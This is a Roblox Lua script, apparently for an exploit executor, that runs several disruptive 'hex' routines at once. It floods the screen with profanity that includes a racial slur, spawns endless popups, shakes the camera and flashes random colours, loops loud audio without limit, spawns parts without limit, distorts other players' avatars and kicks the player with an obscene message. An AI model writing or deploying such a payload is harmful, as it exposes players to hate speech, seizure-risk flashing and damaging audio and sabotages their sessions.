local Camera = game.Workspace.CurrentCamera

function ScreenCover()
	task.wait(10)
	
	local Overlay = Instance.new("ScreenGui")
	local OverlayText = Instance.new("TextLabel")

	Overlay.Name = "Overlay"
	Overlay.Parent = game:WaitForChild("CoreGui")
	Overlay.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Overlay.IgnoreGuiInset = true

	OverlayText.Name = "OverlayText"
	OverlayText.Parent = Overlay
	OverlayText.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	OverlayText.BackgroundTransparency = 0.900
	OverlayText.BorderColor3 = Color3.fromRGB(0, 0, 0)
	OverlayText.BorderSizePixel = 0
	OverlayText.Size = UDim2.new(1, 0, 1, 0)
	OverlayText.Font = Enum.Font.Unknown
	OverlayText.Text = ""
	OverlayText.TextColor3 = Color3.fromRGB(255, 0, 0)
	OverlayText.TextSize = 50.000
	OverlayText.TextWrapped = true
	OverlayText.TextTransparency = 0.7
	OverlayText.TextScaled = true
	

	local function GetRandomPhrase()
		local Phrases = {
			"HATE",
			"ERROR",
			"FUCK",
			"KILL",
			"DIE",
			"HAX",
			"HEX",
			"HACK",
			"NIGGER",
			"BITCH",
			"RAPE",
			"FUCK",
			"ASS",
			"SHIT",
			"FUCK",
			"CUNT",
		}

		return Phrases[math.random(#Phrases)]
	end

	while task.wait(0.1) do
		OverlayText.Text = OverlayText.Text .. " " .. GetRandomPhrase()
	end
end

function ErrorPopup()
	task.wait(15)
	local Popup = Instance.new("ScreenGui")

	Popup.Name = "Popup"
	Popup.Parent = game:WaitForChild("CoreGui")
	Popup.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Popup.IgnoreGuiInset = true

	local Position = Vector2.new(30,30)

	local Count = 0

	while task.wait(0) do
		Count += 1

		local POPUP = Instance.new("ImageLabel")

		POPUP.Name = "POPUP"
		POPUP.Parent = Popup
		POPUP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		POPUP.BorderColor3 = Color3.fromRGB(0, 0, 0)
		POPUP.BorderSizePixel = 0
		POPUP.Position = UDim2.new(0, Position.X, 0, Position.Y)
		POPUP.Size = UDim2.new(0, 284, 0, 170)
		POPUP.Image = "http://www.roblox.com/asset/?id=7323913107"
		POPUP.ImageTransparency = 0.1

		Position += Vector2.new(10, 10)

		if Count >= math.random(30, 60) then
			Count = 0
			Position = Vector2.new(math.random(0, 1000), 30)
		end
	end
end

function FOVChanger()
	while task.wait(0.05) do
		local RandomOffset = Vector3.new(math.random(-100, 100) / 10, math.random(-100, 100) / 10, 0)
		Camera.CFrame = Camera.CFrame * CFrame.new(RandomOffset)
		Camera.FieldOfView = math.random(30, 120)
	end
end

function VisualInverter()
	task.wait(5)
	local lighting = game:GetService("Lighting")

	local colorEffect = Instance.new("ColorCorrectionEffect", lighting)
	colorEffect.Brightness = 0
	colorEffect.Contrast = 0
	colorEffect.Saturation = 0

	while task.wait(math.random(0.05, 0.2)) do
		colorEffect.TintColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
		colorEffect.Contrast = math.random(-5, 5)
		colorEffect.Brightness = math.random(-3, 3)
		colorEffect.Saturation = math.random(-5, 5)
	end
end

function LimbVaporizer()
	while task.wait(math.random(0.1, 0.2)) do
		for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
			if otherPlayer ~= game.Players.LocalPlayer and otherPlayer.Character then
				for _, limb in pairs(otherPlayer.Character:GetChildren()) do
					if limb:IsA("BasePart") then
						limb.Rotation = Vector3.new(math.random(-180, 180), math.random(-180, 180), math.random(-180, 180))
					end
				end
			end
		end
	end
end

function PartSpawner()
	while task.wait() do
		pcall(function()
			local Part = Instance.new("Part")
			Part.Size = Vector3.new(1, 1, 1)
			Part.CanCollide = true
			Part.Name = "Part"
			Part.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
			Part.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,10,0)
			Part.Parent = game.Workspace
		end)
	end
end

function KickPlayer()
	local player = game.Players.LocalPlayer
	task.wait(40)
	player:Kick("FUCK FUCK FUCK FUCK FUCK")
end

function AudioErraper()
    task.wait(2)
	while task.wait() do
		local sound = Instance.new("Sound", game:GetService("SoundService"))
		sound.SoundId = "rbxassetid://138186576"
		sound.Volume = 10
		sound.Looped = true
		sound:Play()
	end
end

function RandomPositioning()
	task.wait(3)
	while task.wait(0.5) do
		game.Players.LocalPlayer.Character.HumanoidRootPart.Position += Vector3.new(math.random(-50,50),math.random(-50,50),math.random(-50,50))
	end
end

local HexTasks = {
	ErrorPopup,
	FOVChanger,
	VisualInverter,
	LimbVaporizer,
	AudioErraper, 
	ScreenCover,
	PartSpawner,
	KickPlayer,
	RandomPositioning,
}

for _, task in pairs(HexTasks) do
	coroutine.wrap(task)()
end
